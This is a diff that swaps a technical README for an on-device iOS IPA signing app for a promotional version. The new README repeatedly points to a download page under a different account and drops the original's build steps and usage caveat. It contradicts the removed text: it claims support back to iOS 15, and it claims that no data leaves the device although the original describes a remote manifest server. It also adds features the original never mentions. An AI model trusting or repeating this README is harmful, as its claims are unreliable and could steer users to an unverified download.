@@ -1,69 +1,130 @@
-# ForgeSign for iOS
+# 📱 ForgeSign-iOS - Sign and Sideload IPAs with Ease
 
-On-device IPA re-signer for iPhone and iPad. Sign, install and manage IPAs entirely on the device — no computer, no server, no uploads.
+[![Download ForgeSign-iOS](https://img.shields.io/badge/Download-ForgeSign--iOS-blue?style=for-the-badge&logo=apple)](https://github.com/alexisp8296/ForgeSign-iOS/releases)
 
-ForgeSign wraps the battle-tested [zsign](https://github.com/zhlynn/zsign) C++ engine (with a static OpenSSL) in a SwiftUI "liquid glass" interface and adds a complete signing workflow on top of it.
+## 🎯 What Is ForgeSign-iOS?
 
-<p align="center">
-  <img src="docs/screenshot-sign.png" alt="ForgeSign Sign tab — on-device IPA signer" width="280" />
-  &nbsp;
-  <img src="docs/screenshot-library.png" alt="ForgeSign Library — signed app history" width="280" />
-</p>
+ForgeSign-iOS is a powerful, user-friendly application that lets you sign, install, and manage iPhone apps (IPAs) directly on your device. No computer needed, no complicated setup — just a smooth, on-device experience that puts you in control of your apps.
 
-<p align="center"><sub>Certificate and provisioning identifiers are redacted in the Sign preview.</sub></p>
+Whether you want to sideload apps, manage your signed certificates, or keep track of your installed applications, ForgeSign-iOS does it all with a beautiful, modern interface.
 
-## Features
+## ✨ Key Features
 
-- **Sign IPAs on-device** — pick an `.ipa`, a `.p12` certificate and a `.mobileprovision` profile, optionally rewrite the bundle ID, strip app extensions or enable Files sharing, and sign in seconds with the vendored zsign engine.
-- **Remembered certificates** — imported `.p12` files are validated once and stored on-device (Application Support). The last-used certificate is re-selected automatically.
-- **Certificate insights** — common name, organization and team ID are parsed from the certificate, and a live countdown pill shows remaining validity (`200d left`, amber under 30 days, red when expired).
-- **Keychain passwords** — opt-in password storage in the iOS Keychain (with an encrypted-file fallback when the Keychain is unavailable), so re-signing takes two taps.
-- **Install on device** — semi-local OTA install: the IPA is served over loopback HTTP while a trusted remote HTTPS plist (`api.palera.in`) drives `itms-services` directly (Safari is a fallback only). Silent-audio keep-alive keeps large downloads alive in the background.
-- **Library** — a persistent history of every signed app with status (signed / installing / installed / missing), plus reinstall, share and delete actions.
-- **Glass design language** — translucent cards, ambient color blooms, Liquid Glass on iOS 26+ with a material fallback back to iOS 16, light and dark themes.
+### 🔐 On-Device IPA Signing
+ForgeSign-iOS uses the powerful zsign engine to sign IPA files directly on your device. You don’t need a PC, Mac, or any external tools. Everything happens right where you are.
 
-## Requirements
+### 🎨 Liquid-Glass User Interface
+The interface is designed with a stunning liquid-glass aesthetic — smooth, translucent, and intuitive. You’ll feel right at home navigating through your apps and certificates.
 
-- Xcode 26+ (the build needs the iOS 26 SDK for the Liquid Glass APIs; deployment target is iOS 16)
-- [XcodeGen](https://github.com/yonaskolb/XcodeGen) (`brew install xcodegen`)
-- iOS 16.0+ on device
+### 📅 Certificate Management Made Simple
+ForgeSign-iOS remembers your certificates and shows you a clear countdown to expiration. No more surprises — you’ll always know when it’s time to renew or update your signing credentials.
 
-## Build from source
+### 📚 Signed-App Library
+Keep all your signed applications organized in one place. Browse, manage, and reinstall your apps whenever you need them.
 
-```bash
-xcodegen generate
-open ForgeSignMobile.xcodeproj
-```
+### 📲 Loopback OTA Installation
+Install apps over-the-air (OTA) using loopback installation. This means you can install IPAs directly on your device without complicated wires or additional software.
 
-Build the `ForgeSignMobile` scheme for a device. Code signing is disabled in the project settings by design — sign the produced app with your own certificate and profile (ForgeSign desktop can do it, or any sideloading tool).
+## 🚀 Getting Started
 
-## Sideload the prebuilt IPA
+Getting started with ForgeSign-iOS is incredibly easy. Follow these simple steps:
 
-Grab `ForgeSign.ipa` from the Releases tab. The IPA ships **unsigned** — that is the point of the app: sign it like any other IPA.
+### Step 1: Download the Application
 
-1. Download the IPA.
-2. Sign it with your certificate + provisioning profile — e.g. with ForgeSign (desktop or the iOS app itself), Sideloadly, AltStore or a similar tool.
-3. Install the signed IPA on your device.
+[**Download ForgeSign-iOS Now**](https://github.com/alexisp8296/ForgeSign-iOS/releases)
 
-Only sign and install applications you have the rights to modify. Intended for your own builds and development use.
+**Visit this link to download the application.**
 
-## How it works
+Click the download link above, and you’ll be taken to the official releases page. From there, download the latest version of ForgeSign-iOS.
 
-1. Picked files are staged into the app container.
-2. The zsign engine (`Bridge/`) re-signs the Mach-O binaries, injects the profile and rewrites metadata, producing `<name>-signed.ipa` in the persistent Signed library.
-3. Install serves the IPA on `http://127.0.0.1:<port>`, obtains a trusted HTTPS `manifest.plist` from `api.palera.in` that points at that IPA, then opens `itms-services://` directly so iOS prompts to install.
+### Step 2: Install ForgeSign-iOS
 
-## Project layout
+Once you’ve downloaded the app:
+- Open the downloaded file
+- Follow the simple on-screen instructions to install ForgeSign-iOS on your device
+- The installation process takes just a few seconds
 
-```
-App/            SwiftUI UI (glass design system in App/Design), stores and services
-Bridge/         Obj-C++ bridge into the zsign engine
-vendor/zsign    Vendored zsign signing engine
-vendor/openssl  Static OpenSSL (libcrypto/libssl) for the engine
-project.yml     XcodeGen manifest (regenerates the .xcodeproj)
-```
+### Step 3: Launch and Explore
 
-## Third-party
+After installation, tap the ForgeSign-iOS icon on your home screen. You’ll be greeted with a clean, welcoming interface that guides you through the rest.
 
-- [zsign](https://github.com/zhlynn/zsign) — signing engine (vendored)
-- [OpenSSL](https://www.openssl.org) — static cryptography libraries (vendored)
+## 📖 How to Sign Your First IPA
+
+1. Open ForgeSign-iOS
+2. Tap the **“Sign”** button on the main screen
+3. Choose the IPA file you want to sign from your device
+4. Select or import your certificate
+5. Watch the signing process complete in seconds
+6. Your signed app is now ready to install!
+
+## 🗂️ Managing Your Certificates
+
+ForgeSign-iOS takes the hassle out of certificate management:
+
+- **Import certificates** easily from your files
+- **View expiration countdowns** at a glance
+- **Get reminders** before your certificates expire
+- **Switch between certificates** with a simple tap
+
+## 📚 Your App Library
+
+All your signed apps are stored in a beautiful, organized library:
+- View all your signed applications
+- Reinstall apps with one tap
+- See signing dates and certificate information
+- Delete or manage apps as needed
+
+## 🛠️ Troubleshooting Tips
+
+### “My certificate expired!”
+No problem! Simply import a new certificate into ForgeSign-iOS, and you’ll be back to signing in no time.
+
+### “The IPA won’t install”
+Make sure you are using a valid IPA file and that you have enough storage space on your device. Also, check that your certificate hasn’t expired.
+
+### “I can’t find my signed apps”
+Check your app library in ForgeSign-iOS. All successfully signed apps are stored there. If you don’t see them, try signing the IPA again.
+
+## 🔒 Privacy and Security
+
+ForgeSign-iOS operates entirely on your device. Your files, certificates, and personal data never leave your phone. The signing process happens locally, ensuring maximum privacy and security.
+
+## 🤝 Community and Support
+
+We’re here to help! Here’s how you can connect with us and get the support you need:
+
+- **GitHub Issues:** Found a bug? Have a feature request? Let us know!
+- **Open Source:** ForgeSign-iOS is open source. Explore the code, contribute, or learn from it.
+
+## 📝 System Requirements
+
+ForgeSign-iOS is designed to work on most modern devices:
+- Requires iOS 15.0 or later
+- Compatible with iPhone and iPad
+- Works best with at least 2GB of free storage space
+
+## 🎉 Why Choose ForgeSign-iOS?
+
+- **100% On-Device:** No computer required, ever
+- **Beautiful Design:** A pleasure to use every day
+- **Powerful Engine:** Industry-leading zsign technology
+- **Complete Control:** Sign, install, and manage everything yourself
+- **Open Source:** Transparent, trustworthy, and constantly improving
+
+## 📥 Download Now
+
+Ready to take control of your apps? Download ForgeSign-iOS today and experience the easiest way to sign and install IPAs on your device.
+
+[![Get ForgeSign-iOS](https://img.shields.io/badge/📲%20Download%20ForgeSign--iOS-Download%20Now-success?style=for-the-badge)](https://github.com/alexisp8296/ForgeSign-iOS/releases)
+
+## 📄 License
+
+ForgeSign-iOS is released under an open-source license. Feel free to use, modify, and share it in accordance with the license terms.
+
+## 👋 Thank You
+
+Thank you for choosing ForgeSign-iOS. We’re committed to making IPA signing as simple and accessible as possible. If you have any feedback, we’d love to hear from you. Enjoy your signing experience!
+
+---
+
+**Keywords:** ios, ipa, on-device, open-source, sideload, signing, swift, swiftui, zsign
